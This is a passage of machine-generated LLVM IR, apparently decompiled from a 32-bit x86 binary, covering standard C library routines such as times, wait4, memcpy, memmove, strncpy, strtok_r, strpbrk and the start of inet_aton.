  br label %dec_label_pc_804bdc1

dec_label_pc_804bdc1:                             ; preds = %dec_label_pc_804bdb3, %dec_label_pc_804bd9a, %dec_label_pc_804bd8a
  %storemerge = phi i32 [ -1, %dec_label_pc_804bd8a ], [ %v7_804bda7, %dec_label_pc_804bd9a ], [ -1, %dec_label_pc_804bdb3 ]
  %v2_804bdc1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bdc1, i32* @edx, align 4
  store i32 %v0_804bd71, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804bda7, { 1, 0, 2 }
  uselistorder i32 %v0_804bd9f, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bdc8 = load i32, i32* @edi, align 4
  store i32 %v0_804bdc8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804bdd0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804bdd8 = call i32 @times(i32 %v0_804bdd0)
  store i32 %v1_804bdd8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804bdd8, -4095
  br i1 %tmp, label %dec_label_pc_804bdf0, label %dec_label_pc_804bde4

dec_label_pc_804bde4:                             ; preds = %entry
  %v1_804bde4 = call i32 @__errno_location(i32 %v0_804bdd0)
  %v0_804bde9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804bde9 = sub i32 0, %v0_804bde9
  %v2_804bdeb = inttoptr i32 %v1_804bde4 to i32*
  store i32 %v1_804bde9, i32* %v2_804bdeb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804bdf0

dec_label_pc_804bdf0:                             ; preds = %entry, %dec_label_pc_804bde4
  %v0_804bdf1 = phi i32 [ %v1_804bdd8, %entry ], [ -1, %dec_label_pc_804bde4 ]
  %v2_804bdf4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bdf4, i32* @edi, align 4
  ret i32 %v0_804bdf1

; uselistorder directives
  uselistorder i32 %v1_804bdd8, { 1, 0, 2 }
  uselistorder i32 (i32)* @times, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bdf0, { 1, 0 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804bdf8 = load i32, i32* @edi, align 4
  %v0_804bdf9 = load i32, i32* @esi, align 4
  store i32 %v0_804bdf9, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_804be0d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804be15 = call i32 @wait4(i32 %v0_804be0d, i32 %v0_804bdf9, i32 %v0_804bdf8, i32 %tmp5)
  store i32 %v0_804be0d, i32* @ebx, align 4
  store i32 %v4_804be15, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804be15, -4095
  br i1 %tmp, label %dec_label_pc_804be2d, label %dec_label_pc_804be21

dec_label_pc_804be21:                             ; preds = %entry
  %v1_804be21 = call i32 @__errno_location(i32 %v0_804be0d)
  %v0_804be26 = load i32, i32* %esi.global-to-local, align 4
  %v1_804be26 = sub i32 0, %v0_804be26
  %v2_804be28 = inttoptr i32 %v1_804be21 to i32*
  store i32 %v1_804be26, i32* %v2_804be28, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804be2d

dec_label_pc_804be2d:                             ; preds = %entry, %dec_label_pc_804be21
  %v0_804be2e = phi i32 [ %v4_804be15, %entry ], [ -1, %dec_label_pc_804be21 ]
  %v2_804be30 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804be30, i32* @esi, align 4
  store i32 %v0_804bdf8, i32* @edi, align 4
  ret i32 %v0_804be2e

; uselistorder directives
  uselistorder i32 %v4_804be15, { 1, 0, 2 }
  uselistorder i32 %v0_804be0d, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_804be2d, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8052524.83 to i32)
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804be3d = load i32, i32* @esi, align 4
  store i32 %v0_804be3d, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804be3e = sdiv i32 %sext, 16777216
  store i32 %v4_804be3e, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804be46 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804be46, i32* %edi.global-to-local, align 4
  %v2_804be4c = udiv i32 %v4_804be3e, 4
  %v3_804be4f = inttoptr i32 %arg2 to i8*
  %v4_804be4f = bitcast i16* %arg1 to i8*
  %v5_804be4f = call i8* @_memcpy(i8* %v4_804be4f, i8* %v3_804be4f, i32 %v2_804be4c)
  %v6_804be4f = ptrtoint i8* %v5_804be4f to i32
  store i32 %v6_804be4f, i32* @ecx, align 4
  %v0_804be51 = load i32, i32* %eax.global-to-local, align 4
  %v2_804be51 = and i32 %v0_804be51, 2
  %v3_804be51 = icmp eq i32 %v2_804be51, 0
  br i1 %v3_804be51, label %dec_label_pc_804be57, label %dec_label_pc_804be55

dec_label_pc_804be55:                             ; preds = %entry
  %v0_804be55 = load i32, i32* %esi.global-to-local, align 4
  %v1_804be55 = inttoptr i32 %v0_804be55 to i16*
  %v2_804be55 = load i16, i16* %v1_804be55, align 2
  %v3_804be55 = load i32, i32* %edi.global-to-local, align 4
  %v4_804be55 = inttoptr i32 %v3_804be55 to i16*
  store i16 %v2_804be55, i16* %v4_804be55, align 2
  %v5_804be55 = load i32, i32* %edi.global-to-local, align 4
  %v6_804be55 = load i32, i32* %esi.global-to-local, align 4
  %v7_804be55 = load i1, i1* @df, align 1
  %v8_804be55 = select i1 %v7_804be55, i32 -2, i32 2
  %v9_804be55 = add i32 %v8_804be55, %v5_804be55
  %v10_804be55 = add i32 %v8_804be55, %v6_804be55
  store i32 %v9_804be55, i32* %edi.global-to-local, align 4
  store i32 %v10_804be55, i32* %esi.global-to-local, align 4
  %v0_804be57.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804be57

dec_label_pc_804be57:                             ; preds = %entry, %dec_label_pc_804be55
  %v0_804be57 = phi i32 [ %v0_804be51, %entry ], [ %v0_804be57.pre, %dec_label_pc_804be55 ]
  %v2_804be57 = urem i32 %v0_804be57, 2
  %v3_804be57 = icmp eq i32 %v2_804be57, 0
  br i1 %v3_804be57, label %dec_label_pc_804be5c, label %dec_label_pc_804be5b

dec_label_pc_804be5b:                             ; preds = %dec_label_pc_804be57
  %v0_804be5b = load i32, i32* %esi.global-to-local, align 4
  %v1_804be5b = inttoptr i32 %v0_804be5b to i8*
  %v2_804be5b = load i8, i8* %v1_804be5b, align 1
  %v3_804be5b = load i32, i32* %edi.global-to-local, align 4
  %v4_804be5b = inttoptr i32 %v3_804be5b to i8*
  store i8 %v2_804be5b, i8* %v4_804be5b, align 1
  %v5_804be5b = load i32, i32* %edi.global-to-local, align 4
  %v6_804be5b = load i32, i32* %esi.global-to-local, align 4
  %v7_804be5b = load i1, i1* @df, align 1
  %v8_804be5b = select i1 %v7_804be5b, i32 -1, i32 1
  %v9_804be5b = add i32 %v8_804be5b, %v5_804be5b
  %v10_804be5b = add i32 %v8_804be5b, %v6_804be5b
  store i32 %v9_804be5b, i32* %edi.global-to-local, align 4
  store i32 %v10_804be5b, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804be5c

dec_label_pc_804be5c:                             ; preds = %dec_label_pc_804be57, %dec_label_pc_804be5b
  store i32 %v4_804be46, i32* %eax.global-to-local, align 4
  %v2_804be60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804be60, i32* @esi, align 4
  ret i32 %v4_804be46

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804be5c, { 1, 0 }
  uselistorder label %dec_label_pc_804be57, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804be65 = load i32, i32* @esi, align 4
  store i32 %v0_804be65, i32* %stack_var_-8, align 4
  %v4_804be66 = ptrtoint i8* %arg1 to i32
  %v9_804be72 = icmp ugt i8* %tmp3, %arg1
  %v1_804be74 = icmp eq i1 %v9_804be72, false
  br i1 %v1_804be74, label %dec_label_pc_804be7c, label %dec_label_pc_804be76

dec_label_pc_804be76:                             ; preds = %entry
  %v7_804be78 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_804be88

dec_label_pc_804be7c:                             ; preds = %entry
  %v3_804be7c = add i32 %arg2, -1
  %v4_804be7c = add i32 %v3_804be7c, %tmp
  %v5_804be7c = inttoptr i32 %v4_804be7c to i8*
  %v3_804be80 = add i32 %v4_804be66, -1
  %v4_804be80 = add i32 %v3_804be80, %tmp
  %v5_804be80 = inttoptr i32 %v4_804be80 to i8*
  %v7_804be85 = call i8* @_memcpy(i8* %v5_804be80, i8* %v5_804be7c, i32 %tmp)
  br label %dec_label_pc_804be88

dec_label_pc_804be88:                             ; preds = %dec_label_pc_804be76, %dec_label_pc_804be7c
  %v2_804be88 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804be88, i32* @esi, align 4
  ret i32 %v4_804be66

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804be88, { 1, 0 }
}

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804be8d = load i32, i32* @esi, align 4
  store i32 %v0_804be8d, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804be99 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804be99, i32* %edi.global-to-local, align 4
  %v1_804be9d = add i32 %arg3, 1
  store i32 %v1_804be9d, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804be9e

dec_label_pc_804be9e:                             ; preds = %dec_label_pc_804bea1, %entry
  %v3_804bea2 = phi i32 [ %v4_804be99, %entry ], [ %v8_804bea2, %dec_label_pc_804bea1 ]
  %v0_804be9e = phi i32 [ %v1_804be9d, %entry ], [ %v0_804be9e.pre, %dec_label_pc_804bea1 ]
  %v1_804be9e = add i32 %v0_804be9e, -1
  %v8_804be9e = icmp eq i32 %v1_804be9e, 0
  store i32 %v1_804be9e, i32* %ecx.global-to-local, align 4
  br i1 %v8_804be9e, label %.loopexit, label %dec_label_pc_804bea1

dec_label_pc_804bea1:                             ; preds = %dec_label_pc_804be9e
  %v0_804bea1 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bea1 = inttoptr i32 %v0_804bea1 to i8*
  %v2_804bea1 = load i8, i8* %v1_804bea1, align 1
  %v10_804bea1 = load i1, i1* @df, align 1
  %v11_804bea1 = select i1 %v10_804bea1, i32 -1, i32 1
  %v12_804bea1 = add i32 %v11_804bea1, %v0_804bea1
  store i32 %v12_804bea1, i32* %esi.global-to-local, align 4
  %v4_804bea2 = inttoptr i32 %v3_804bea2 to i8*
  store i8 %v2_804bea1, i8* %v4_804bea2, align 1
  %v5_804bea2 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bea2 = load i1, i1* @df, align 1
  %v7_804bea2 = select i1 %v6_804bea2, i32 -1, i32 1
  %v8_804bea2 = add i32 %v7_804bea2, %v5_804bea2
  store i32 %v8_804bea2, i32* %edi.global-to-local, align 4
  %v6_804bea3 = icmp eq i8 %v2_804bea1, 0
  %v1_804bea5 = icmp eq i1 %v6_804bea3, false
  %v0_804be9e.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804bea5, label %dec_label_pc_804be9e, label %dec_label_pc_804bea7

dec_label_pc_804bea7:                             ; preds = %dec_label_pc_804bea1
  %v1_804bea7 = add i32 %v0_804be9e.pre, -1
  store i32 %v1_804bea7, i32* %ecx.global-to-local, align 4
  %v2_804bea8 = sext i8 %v2_804bea1 to i32
  %v4_804bea8 = inttoptr i32 %v8_804bea2 to i8*
  %v5_804bea8 = call i8* @_memset(i8* %v4_804bea8, i32 %v2_804bea8, i32 %v1_804bea7)
  %v6_804bea8 = ptrtoint i8* %v5_804bea8 to i32
  store i32 %v6_804bea8, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804be9e, %dec_label_pc_804bea7
  %v2_804beae = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804beae, i32* @edx, align 4
  %v2_804beaf = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804beaf, i32* @esi, align 4
  ret i32 %v4_804be99

; uselistorder directives
  uselistorder i32 %v8_804bea2, { 0, 2, 1 }
  uselistorder i8 %v2_804bea1, { 0, 2, 1 }
  uselistorder i32 %v1_804be9e, { 1, 0 }
  uselistorder i32 %v4_804be99, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804beb4 = load i32, i32* @edi, align 4
  %v0_804beb5 = load i32, i32* @esi, align 4
  %v0_804beb6 = load i32, i32* @ebx, align 4
  store i32 %v0_804beb6, i32* %stack_var_-12, align 4
  %v4_804beb7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804beb7, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804bec3 = icmp eq i8* %arg1, null
  %v1_804bec5 = icmp eq i1 %v1_804bec3, false
  br i1 %v1_804bec5, label %dec_label_pc_804bec9, label %dec_label_pc_804bec7

dec_label_pc_804bec7:                             ; preds = %entry
  %v1_804bec7 = inttoptr i32 %arg3 to i32*
  %v2_804bec7 = load i32, i32* %v1_804bec7, align 4
  store i32 %v2_804bec7, i32* @ebx, align 4
  br label %dec_label_pc_804bec9

dec_label_pc_804bec9:                             ; preds = %entry, %dec_label_pc_804bec7
  %v0_804becc = phi i32 [ %v4_804beb7, %entry ], [ %v2_804bec7, %dec_label_pc_804bec7 ]
  %v0_804bec9 = load i32, i32* @ecx, align 4
  %v5_804becc = inttoptr i32 %v0_804becc to i8*
  %v8_804becd = call i32 @__GI_strspn(i8* %v5_804becc, i32 %arg2, i32 %v0_804bec9, i32 %v0_804bec9)
  store i32 %v8_804becd, i32* %eax.global-to-local, align 4
  %v0_804bed5 = load i32, i32* @ebx, align 4
  %v2_804bed5 = add i32 %v0_804bed5, %v8_804becd
  store i32 %v2_804bed5, i32* @ebx, align 4
  %v1_804bed7 = inttoptr i32 %v2_804bed5 to i8*
  %v2_804bed7 = load i8, i8* %v1_804bed7, align 1
  %v3_804bed7 = icmp eq i8 %v2_804bed7, 0
  %v1_804beda = icmp eq i1 %v3_804bed7, false
  br i1 %v1_804beda, label %dec_label_pc_804bee2, label %dec_label_pc_804bedc

dec_label_pc_804bedc:                             ; preds = %dec_label_pc_804bec9
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804bede = load i32, i32* @esi, align 4
  %v2_804bede = inttoptr i32 %v1_804bede to i32*
  store i32 %v2_804bed5, i32* %v2_804bede, align 4
  %v0_804bf0c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bf09

dec_label_pc_804bee2:                             ; preds = %dec_label_pc_804bec9
  %v0_804bee2 = load i32, i32* @edx, align 4
  %v0_804bee4 = load i32, i32* @edi, align 4
  %v8_804bee6 = call i32 @__GI_strpbrk(i8* %v1_804bed7, i32 %v0_804bee4, i32 %v0_804bee2, i32 %v0_804bee2)
  store i32 %v8_804bee6, i32* %eax.global-to-local, align 4
  %v2_804beee = icmp eq i32 %v8_804bee6, 0
  %v1_804bef0 = icmp eq i1 %v2_804beee, false
  br i1 %v1_804bef0, label %dec_label_pc_804bf01, label %dec_label_pc_804bef2

dec_label_pc_804bef2:                             ; preds = %dec_label_pc_804bee2
  %v0_804bef6 = load i32, i32* @ebx, align 4
  %v5_804bef6 = inttoptr i32 %v0_804bef6 to i8*
  %v8_804bef7 = call i32 @rawmemchr(i8* %v5_804bef6, i32 0, i32 %v8_804bee6, i32 %v8_804bee6)
  br label %dec_label_pc_804bf05

dec_label_pc_804bf01:                             ; preds = %dec_label_pc_804bee2
  %v9_804bee6 = inttoptr i32 %v8_804bee6 to i8*
  store i8 0, i8* %v9_804bee6, align 1
  %v2_804bf04 = add i32 %v8_804bee6, 1
  br label %dec_label_pc_804bf05

dec_label_pc_804bf05:                             ; preds = %dec_label_pc_804bef2, %dec_label_pc_804bf01
  %storemerge = phi i32 [ %v2_804bf04, %dec_label_pc_804bf01 ], [ %v8_804bef7, %dec_label_pc_804bef2 ]
  %v0_804bf05 = phi i32 [ %v2_804bf04, %dec_label_pc_804bf01 ], [ %v8_804bef7, %dec_label_pc_804bef2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804bf05 = load i32, i32* @esi, align 4
  %v2_804bf05 = inttoptr i32 %v1_804bf05 to i32*
  store i32 %v0_804bf05, i32* %v2_804bf05, align 4
  %v0_804bf07 = load i32, i32* @ebx, align 4
  store i32 %v0_804bf07, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bf09

dec_label_pc_804bf09:                             ; preds = %dec_label_pc_804bedc, %dec_label_pc_804bf05
  %v0_804bf0c = phi i32 [ %v0_804bf0c.pre, %dec_label_pc_804bedc ], [ %v0_804bf07, %dec_label_pc_804bf05 ]
  %v2_804bf09 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bf09, i32* @ebx, align 4
  store i32 %v0_804beb5, i32* @esi, align 4
  store i32 %v0_804beb4, i32* @edi, align 4
  ret i32 %v0_804bf0c

; uselistorder directives
  uselistorder i32 %v8_804bee6, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bf09, { 1, 0 }
  uselistorder label %dec_label_pc_804bf05, { 1, 0 }
  uselistorder label %dec_label_pc_804bec9, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804bf11 = load i32, i32* @ebx, align 4
  %v2_804bf2825 = load i8, i8* %arg1, align 1
  %v4_804bf2a29 = icmp eq i8 %v2_804bf2825, 0
  br i1 %v4_804bf2a29, label %dec_label_pc_804bf32, label %dec_label_pc_804bf2e.lr.ph

dec_label_pc_804bf2e.lr.ph:                       ; preds = %entry
  %v3_804bf2826 = zext i8 %v2_804bf2825 to i32
  %v5_804bf2827 = and i32 %v0_804bf11, -256
  %v6_804bf2828 = or i32 %v3_804bf2826, %v5_804bf2827
  %v4_804bf16 = ptrtoint i8* %arg1 to i32
  %v1_804bf2113 = inttoptr i32 %arg2 to i8*
  %v4_804bf21.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804bf2e

dec_label_pc_804bf1c:                             ; preds = %dec_label_pc_804bf2e, %dec_label_pc_804bf20
  %v6_804bf2123 = phi i32 [ %v6_804bf21, %dec_label_pc_804bf20 ], [ %v6_804bf2117, %dec_label_pc_804bf2e ]
  %v2_804bf2122 = phi i8 [ %v2_804bf21, %dec_label_pc_804bf20 ], [ %v2_804bf2114, %dec_label_pc_804bf2e ]
  %v0_804bf2021 = phi i32 [ %v1_804bf20, %dec_label_pc_804bf20 ], [ %arg2, %dec_label_pc_804bf2e ]
  %v15_804bf1c = icmp eq i8 %v2_804bf2122, %v2_804bf2833
  br i1 %v15_804bf1c, label %dec_label_pc_804bf34, label %dec_label_pc_804bf20

dec_label_pc_804bf20:                             ; preds = %dec_label_pc_804bf1c
  %v1_804bf20 = add i32 %v0_804bf2021, 1
  store i32 %v1_804bf20, i32* @edx, align 4
  %v1_804bf21 = inttoptr i32 %v1_804bf20 to i8*
  %v2_804bf21 = load i8, i8* %v1_804bf21, align 1
  %v3_804bf21 = zext i8 %v2_804bf21 to i32
  %v5_804bf21 = and i32 %v6_804bf2123, -256
  %v6_804bf21 = or i32 %v3_804bf21, %v5_804bf21
  store i32 %v6_804bf21, i32* @ecx, align 4
  %v4_804bf23 = icmp eq i8 %v2_804bf21, 0
  %v1_804bf25 = icmp eq i1 %v4_804bf23, false
  br i1 %v1_804bf25, label %dec_label_pc_804bf1c, label %dec_label_pc_804bf27

dec_label_pc_804bf27:                             ; preds = %dec_label_pc_804bf20, %dec_label_pc_804bf2e
  %v4_804bf21.pre36 = phi i32 [ %v6_804bf2117, %dec_label_pc_804bf2e ], [ %v6_804bf21, %dec_label_pc_804bf20 ]
  %v1_804bf27 = add i32 %v0_804bf2731, 1
  %v1_804bf28 = inttoptr i32 %v1_804bf27 to i8*
  %v2_804bf28 = load i8, i8* %v1_804bf28, align 1
  %v3_804bf28 = zext i8 %v2_804bf28 to i32
  %v5_804bf28 = and i32 %v6_804bf2834, -256
  %v6_804bf28 = or i32 %v3_804bf28, %v5_804bf28
  %v4_804bf2a = icmp eq i8 %v2_804bf28, 0
  br i1 %v4_804bf2a, label %dec_label_pc_804bf32, label %dec_label_pc_804bf2e

dec_label_pc_804bf2e:                             ; preds = %dec_label_pc_804bf2e.lr.ph, %dec_label_pc_804bf27
  %v4_804bf21.pre = phi i32 [ %v4_804bf21.pre.pre, %dec_label_pc_804bf2e.lr.ph ], [ %v4_804bf21.pre36, %dec_label_pc_804bf27 ]
  %v6_804bf2834 = phi i32 [ %v6_804bf2828, %dec_label_pc_804bf2e.lr.ph ], [ %v6_804bf28, %dec_label_pc_804bf27 ]
  %v2_804bf2833 = phi i8 [ %v2_804bf2825, %dec_label_pc_804bf2e.lr.ph ], [ %v2_804bf28, %dec_label_pc_804bf27 ]
  %v0_804bf2731 = phi i32 [ %v4_804bf16, %dec_label_pc_804bf2e.lr.ph ], [ %v1_804bf27, %dec_label_pc_804bf27 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_804bf2114 = load i8, i8* %v1_804bf2113, align 1
  %v3_804bf2115 = zext i8 %v2_804bf2114 to i32
  %v5_804bf2116 = and i32 %v4_804bf21.pre, -256
  %v6_804bf2117 = or i32 %v3_804bf2115, %v5_804bf2116
  store i32 %v6_804bf2117, i32* @ecx, align 4
  %v4_804bf2318 = icmp eq i8 %v2_804bf2114, 0
  %v1_804bf2520 = icmp eq i1 %v4_804bf2318, false
  br i1 %v1_804bf2520, label %dec_label_pc_804bf1c, label %dec_label_pc_804bf27

dec_label_pc_804bf32:                             ; preds = %dec_label_pc_804bf27, %entry
  br label %dec_label_pc_804bf34

dec_label_pc_804bf34:                             ; preds = %dec_label_pc_804bf1c, %dec_label_pc_804bf32
  %v0_804bf36 = phi i32 [ 0, %dec_label_pc_804bf32 ], [ %v0_804bf2731, %dec_label_pc_804bf1c ]
  store i32 %v0_804bf11, i32* @ebx, align 4
  ret i32 %v0_804bf36

; uselistorder directives
  uselistorder i32 %v6_804bf2117, { 2, 0, 1 }
  uselistorder i8 %v2_804bf2114, { 1, 2, 0 }
  uselistorder i32 %v1_804bf27, { 1, 0 }
  uselistorder i32 %v6_804bf21, { 1, 2, 0 }
  uselistorder i8 %v2_804bf21, { 1, 2, 0 }
  uselistorder i32 %v1_804bf20, { 2, 1, 0 }
  uselistorder i8 %v2_804bf2825, { 0, 2, 1 }
  uselistorder i32 %v0_804bf11, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bf34, { 1, 0 }
  uselistorder label %dec_label_pc_804bf2e, { 1, 0 }
  uselistorder label %dec_label_pc_804bf27, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804bf3f = ptrtoint i8* %arg1 to i32
  store i32 %v4_804bf3f, i32* @ecx, align 4
  %v1_804bf43 = icmp eq i8* %arg1, null
  br i1 %v1_804bf43, label %dec_label_pc_804bfc4, label %dec_label_pc_804bf47

dec_label_pc_804bf47:                             ; preds = %entry
  %v0_804bf52.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804bf52

dec_label_pc_804bf52:                             ; preds = %dec_label_pc_804bf47, %dec_label_pc_804bf9b
  %v2_804bf9b34 = phi i32 [ 1, %dec_label_pc_804bf47 ], [ %v3_804bf9b, %dec_label_pc_804bf9b ]
  %v0_804bf5833 = phi i32 [ %v4_804bf3f, %dec_label_pc_804bf47 ], [ %v0_804bf583, %dec_label_pc_804bf9b ]
  %v0_804bfb932 = phi i32 [ 0, %dec_label_pc_804bf47 ], [ %v2_804bfa1, %dec_label_pc_804bf9b ]
  %v1_804bf58 = inttoptr i32 %v0_804bf5833 to i8*
  %v2_804bf58 = load i8, i8* %v1_804bf58, align 1
  %v3_804bf58 = sext i8 %v2_804bf58 to i32
  %v2_804bf5b = mul nsw i32 %v3_804bf58, 2
  %v3_804bf5b = add i32 %v2_804bf5b, %v0_804bf52.pre
  %v4_804bf5b = inttoptr i32 %v3_804bf5b to i8*
  %v5_804bf5b = load i8, i8* %v4_804bf5b, align 1
  %v6_804bf5b = and i8 %v5_804bf5b, 8
  %v7_804bf5b = icmp eq i8 %v6_804bf5b, 0
  br i1 %v7_804bf5b, label %dec_label_pc_804bfc4, label %dec_label_pc_804bf62

dec_label_pc_804bf62:                             ; preds = %dec_label_pc_804bf52
  %v4_804bf76.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804bf76

dec_label_pc_804bf66:                             ; preds = %dec_label_pc_804bf76
  %v3_804bf66 = mul i32 %v1_804bf66, 10
  %v2_804bf69 = add i32 %v3_804bf66, -48
  %v3_804bf69 = add i32 %v2_804bf69, %v2_804bf78
  %v1_804bf6d = add i32 %v3_804bf69, -255
  %v6_804bf6d = sub i32 254, %v3_804bf69
  %v7_804bf6d = and i32 %v6_804bf6d, %v3_804bf69
  %v8_804bf6d = icmp slt i32 %v7_804bf6d, 0
  %v9_804bf6d = icmp eq i32 %v1_804bf6d, 0
  %v10_804bf6d = icmp slt i32 %v1_804bf6d, 0
  %v3_804bf73 = icmp eq i1 %v10_804bf6d, %v8_804bf6d
  %v4_804bf73 = icmp eq i1 %v9_804bf6d, false
  %v5_804bf73 = and i1 %v4_804bf73, %v3_804bf73
  br i1 %v5_804bf73, label %dec_label_pc_804bfc4, label %dec_label_pc_804bf75

dec_label_pc_804bf75:                             ; preds = %dec_label_pc_804bf66
  %v1_804bf75 = add i32 %v0_804bf75, 1
  store i32 %v1_804bf75, i32* @ecx, align 4
  br label %dec_label_pc_804bf76

dec_label_pc_804bf76:                             ; preds = %dec_label_pc_804bf62, %dec_label_pc_804bf75
  %v1_804bf66 = phi i32 [ 0, %dec_label_pc_804bf62 ], [ %v3_804bf69, %dec_label_pc_804bf75 ]
  %v4_804bf76 = phi i32 [ %v4_804bf76.pre, %dec_label_pc_804bf62 ], [ %v6_804bf76, %dec_label_pc_804bf75 ]
  %v0_804bf75 = phi i32 [ %v0_804bf5833, %dec_label_pc_804bf62 ], [ %v1_804bf75, %dec_label_pc_804bf75 ]
  %v1_804bf76 = inttoptr i32 %v0_804bf75 to i8*
  %v2_804bf76 = load i8, i8* %v1_804bf76, align 1
  %v3_804bf76 = zext i8 %v2_804bf76 to i32
  %v5_804bf76 = and i32 %v4_804bf76, -256
  %v6_804bf76 = or i32 %v3_804bf76, %v5_804bf76
  store i32 %v6_804bf76, i32* @edx, align 4
  %v2_804bf78 = sext i8 %v2_804bf76 to i32
  %v2_804bf7b = mul nsw i32 %v2_804bf78, 2
  %v3_804bf7b = add i32 %v2_804bf7b, %v0_804bf52.pre
  %v4_804bf7b = inttoptr i32 %v3_804bf7b to i16*
  %v5_804bf7b = load i16, i16* %v4_804bf7b, align 2
  %v2_804bf80 = and i16 %v5_804bf7b, 8
  %v3_804bf80 = icmp eq i16 %v2_804bf80, 0
  %v1_804bf82 = icmp eq i1 %v3_804bf80, false
  br i1 %v1_804bf82, label %dec_label_pc_804bf66, label %dec_label_pc_804bf84

dec_label_pc_804bf84:                             ; preds = %dec_label_pc_804bf76
  %v8_804bf84 = sub nsw i32 2, %v2_804bf9b34
  %v9_804bf84 = and i32 %v8_804bf84, %v2_804bf9b34
